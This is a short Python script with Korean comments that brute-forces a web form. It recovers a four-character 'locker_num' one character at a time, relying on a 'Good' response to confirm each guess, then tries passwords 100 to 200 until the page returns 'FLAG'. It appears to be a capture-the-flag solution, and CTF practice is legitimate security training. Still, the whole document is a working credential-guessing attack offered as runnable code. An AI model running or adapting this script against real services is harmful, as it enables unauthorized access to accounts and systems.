import requests
import itertools
import string

# 사용자한테 URL을 입력받아야 함
print("Enter the URL: ", end="")
url = input()

# POST 요청 시 전송할 데이터 구성
data = {
    'locker_num': '',  # 브루트포스로 채울 부분
    'password': ''     # 브루트포스로 채울 부분
}

# 알파벳 소문자와 숫자로 구성된 4자리 문자열을 만들어야 함
# 한자리씩 만들어서 시도, 통과되면 다음 자리로 넘어가기

alphanumeric = string.ascii_lowercase + string.digits
locker_num = ""
for i in range(4):
    for c in alphanumeric:
        data['locker_num'] = locker_num + c
        
        # 현재 시도중인 조합 출력
        print(f'Trying locker_num: {locker_num + c}')
        
        # POST 요청 보내기
        response = requests.post(url, data=data)
        
        # 응답을 받았을 때 처리
        if 'Good' in response.text:
            locker_num += c
            break  # 다음 자리로 넘어가기

# password 브루트포스
for password in range(100, 201):
    data['locker_num'] = locker_num
    data['password'] = str(password)
    
    # 현재 시도중인 조합 출력
    print(f'Trying locker_num: {locker_num}, password: {password}')

    # POST 요청 보내기
    response = requests.post(url, data=data)
    
    # 응답을 받았을 때 처리
    if 'FLAG' in response.text:
        print(f'Found valid combination - locker_num: {locker_num}, password: {password}')        
        break  # 원하는 결과를 찾았으므로 종료